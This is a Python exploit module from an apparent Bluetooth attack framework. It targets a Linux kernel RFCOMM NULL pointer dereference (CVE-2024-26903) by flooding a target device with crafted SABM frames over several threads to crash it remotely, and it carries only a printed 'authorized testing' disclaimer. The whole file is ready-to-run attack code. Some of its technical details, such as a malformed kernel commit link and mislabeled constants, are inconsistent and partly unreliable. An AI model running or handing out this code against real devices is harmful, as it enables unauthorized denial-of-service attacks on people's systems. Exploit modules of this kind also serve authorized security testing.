"""
BlueSploit Module: Linux rfcomm_check_security() NULL Pointer Dereference (CVE-2024-26903)
CWE-476 NULL Pointer Dereference in Linux kernel RFCOMM security check

A NULL pointer dereference in rfcomm_check_security() allows a remote
attacker to crash the Linux kernel Bluetooth subsystem. The function
dereferences the sk->sk_state_change function pointer without verifying
that the pointer is valid when called from an abnormal context (e.g.,
during connection setup when the security callback is not yet initialized).

Author: v33ru
CVE: CVE-2024-26903
CWE: CWE-476 (NULL Pointer Dereference)
"""

import struct
import socket
import time
import os
import threading
from core.base import (
    ExploitModule, ModuleInfo, ModuleOption,
    BTProtocol, Severity
)
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors
)

try:
    import bluetooth
    BLUETOOTH_AVAILABLE = True
except ImportError:
    BLUETOOTH_AVAILABLE = False

RFCOMM_PSM  = 0x0003
RFCOMM_SABM = 0x2F
RFCOMM_UA   = 0x63
RFCOMM_UIH  = 0xEF
RFCOMM_DM   = 0x0F

# Security-triggering MCC types
MCC_SECMOD = 0x53  # Remote Line Status (used to probe security path)
MCC_NSC    = 0x11  # Non-Supported Command response (triggers error path)


class Module(ExploitModule):
    """
    Linux rfcomm_check_security() NULL Pointer Dereference (CVE-2024-26903)

    Triggers a NULL pointer dereference in rfcomm_check_security() by
    sending a connection sequence that hits the security check before
    the security callback is properly initialized. This occurs when:
    - An RFCOMM SABM is received for a DLC
    - rfcomm_check_security() is called on the session
    - The l2cap_conn->hcon security pointer is NULL (pre-auth state)

    By opening connections before BT pairing completes and flooding
    with rapid SABM frames, we force rfcomm_check_security() to
    execute in an unsafe state, dereferencing NULL.

    Impact: Remote kernel crash (NULL deref oops) — no auth required
    Severity: HIGH — remotely triggerable DoS
    """

    info = ModuleInfo(
        name="Linux rfcomm_check_security() NULL Deref DoS",
        description=(
            "Remote kernel NULL pointer dereference in rfcomm_check_security() "
            "(CVE-2024-26903) — no authentication required"
        ),
        author=["v33ru"],
        protocol=BTProtocol.CLASSIC,
        severity=Severity.HIGH,
        cve=["CVE-2024-26903"],
        references=[
            "https://nvd.nist.gov/vuln/detail/CVE-2024-26903",
            "https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=CVE-2024-26903",
        ],
    )

    def _setup_options(self) -> None:
        self.add_option(ModuleOption(
            name="target",
            required=True,
            description="Target BD_ADDR (XX:XX:XX:XX:XX:XX)",
        ))
        self.add_option(ModuleOption(
            name="interface",
            required=False,
            description="Local HCI adapter",
            default="hci0",
        ))
        self.add_option(ModuleOption(
            name="threads",
            required=False,
            description="Concurrent connection threads",
            default=4,
        ))
        self.add_option(ModuleOption(
            name="attempts",
            required=False,
            description="Total connection attempts",
            default=40,
        ))
        self.add_option(ModuleOption(
            name="sabm_burst",
            required=False,
            description="SABM frames per connection before teardown",
            default=8,
        ))

    def check(self) -> bool:
        if not BLUETOOTH_AVAILABLE:
            print_error("pybluez2 required — pip install pybluez2")
            return False
        target = self.get_option("target")
        if not self.validate_bd_addr(target):
            print_error(f"Invalid BD_ADDR: {target}")
            return False
        try:
            s = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            s.settimeout(5.0)
            s.connect((target, RFCOMM_PSM))
            s.close()
            print_success(f"RFCOMM PSM reachable — {target} may be vulnerable to CVE-2024-26903")
            return True
        except bluetooth.BluetoothError as e:
            print_error(f"Unreachable: {e}")
            return False

    def run(self) -> bool:
        if not BLUETOOTH_AVAILABLE:
            print_error("pybluez2 required — pip install pybluez2")
            return False
        if os.geteuid() != 0:
            print_error("Root privileges required")
            return False

        target     = self.get_option("target")
        n_threads  = int(self.get_option("threads"))
        attempts   = int(self.get_option("attempts"))
        sabm_burst = int(self.get_option("sabm_burst"))

        if not self.validate_bd_addr(target):
            print_error(f"Invalid BD_ADDR: {target}")
            return False

        print_info(f"Target      : {target}")
        print_info(f"Threads     : {n_threads}")
        print_info(f"Attempts    : {attempts}")
        print_info(f"SABM burst  : {sabm_burst} frames per connection")
        print_info("─" * 50)
        print_warning("DISCLAIMER: For authorized security testing only!")
        print_info("Triggering CVE-2024-26903 — rfcomm_check_security() NULL deref...")

        stats = {"sent": 0, "errors": 0, "crash_signals": 0}
        per_thread = max(1, attempts // n_threads)
        stop = threading.Event()
        threads = []

        def worker(tid: int) -> None:
            for _ in range(per_thread):
                if stop.is_set():
                    break
                try:
                    sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
                    sock.settimeout(3.0)
                    sock.connect((target, RFCOMM_PSM))

                    # Rapid SABM burst before security negotiation completes
                    # This hits rfcomm_check_security() with NULL hcon
                    for ch in range(1, sabm_burst + 1):
                        dlci = ch << 1 | 1
                        sock.send(self._sabm(dlci))

                    stats["sent"] += sabm_burst
                    sock.close()

                except bluetooth.BluetoothError as e:
                    stats["errors"] += 1
                    if "Connection refused" in str(e) or "Host" in str(e):
                        stats["crash_signals"] += 1
                        stop.set()
                except OSError:
                    stats["errors"] += 1
                    stats["crash_signals"] += 1
                    stop.set()

        for i in range(n_threads):
            t = threading.Thread(target=worker, args=(i,), daemon=True)
            t.start()
            threads.append(t)

        for t in threads:
            t.join(timeout=30.0)

        print_info("─" * 50)
        print_success(f"CVE-2024-26903: Sent {stats['sent']} SABM frames to {target}")

        if stats["crash_signals"] > 0:
            print_success(f"Crash signals detected: {stats['crash_signals']} connection refusals")
            print_success("Kernel may have crashed — check target dmesg for NULL ptr oops")
        else:
            print_info("No crash signals — target may be patched or timing needs adjustment")

        self.add_result({
            "target": target,
            "sabm_sent": stats["sent"],
            "errors": stats["errors"],
            "crash_signals": stats["crash_signals"],
            "cve": "CVE-2024-26903",
        })
        return stats["sent"] > 0

    def _sabm(self, dlci: int) -> bytes:
        addr = (dlci << 2) | 0x03
        ctrl = RFCOMM_SABM | 0x10
        length = 0x01
        fcs = self._fcs(bytes([addr, ctrl, length]))
        return struct.pack("BBBB", addr, ctrl, length, fcs)

    @staticmethod
    def _fcs(data: bytes) -> int:
        table = [
            0x00,0x91,0xE3,0x72,0x07,0x96,0xE4,0x75,0x0E,0x9F,0xED,0x7C,0x09,0x98,0xEA,0x7B,
            0x1C,0x8D,0xFF,0x6E,0x1B,0x8A,0xF8,0x69,0x12,0x83,0xF1,0x60,0x15,0x84,0xF6,0x67,
            0x38,0xA9,0xDB,0x4A,0x3F,0xAE,0xDC,0x4D,0x36,0xA7,0xD5,0x44,0x31,0xA0,0xD2,0x43,
            0x24,0xB5,0xC7,0x56,0x23,0xB2,0xC0,0x51,0x2A,0xBB,0xC9,0x58,0x2D,0xBC,0xCE,0x5F,
            0x70,0xE1,0x93,0x02,0x77,0xE6,0x94,0x05,0x7E,0xEF,0x9D,0x0C,0x79,0xE8,0x9A,0x0B,
            0x6C,0xFD,0x8F,0x1E,0x6B,0xFA,0x88,0x19,0x62,0xF3,0x81,0x10,0x65,0xF4,0x86,0x17,
            0x48,0xD9,0xAB,0x3A,0x4F,0xDE,0xAC,0x3D,0x46,0xD7,0xA5,0x34,0x41,0xD0,0xA2,0x33,
            0x54,0xC5,0xB7,0x26,0x53,0xC2,0xB0,0x21,0x5A,0xCB,0xB9,0x28,0x5D,0xCC,0xBE,0x2F,
            0xE0,0x71,0x03,0x92,0xE7,0x76,0x04,0x95,0xEE,0x7F,0x0D,0x9C,0xE9,0x78,0x0A,0x9B,
            0xFC,0x6D,0x1F,0x8E,0xFB,0x6A,0x18,0x89,0xF2,0x63,0x11,0x80,0xF5,0x64,0x16,0x87,
            0xD8,0x49,0x3B,0xAA,0xDF,0x4E,0x3C,0xAD,0xD6,0x47,0x35,0xA4,0xD1,0x40,0x32,0xA3,
            0xC4,0x55,0x27,0xB6,0xC3,0x52,0x20,0xB1,0xCA,0x5B,0x29,0xB8,0xCD,0x5C,0x2E,0xBF,
            0x90,0x01,0x73,0xE2,0x97,0x06,0x74,0xE5,0x9E,0x0F,0x7D,0xEC,0x99,0x08,0x7A,0xEB,
            0x8C,0x1D,0x6F,0xFE,0x8B,0x1A,0x68,0xF9,0x82,0x13,0x61,0xF0,0x85,0x14,0x66,0xF7,
            0xA8,0x39,0x4B,0xDA,0xAF,0x3E,0x4C,0xDD,0xA6,0x37,0x45,0xD4,0xA1,0x30,0x42,0xD3,
            0xB4,0x25,0x57,0xC6,0xB3,0x22,0x50,0xC1,0xBA,0x2B,0x59,0xC8,0xBD,0x2C,0x5E,0xCF,
        ]
        fcs = 0xFF
        for b in data:
            fcs = table[fcs ^ b]
        return 0xFF - fcs
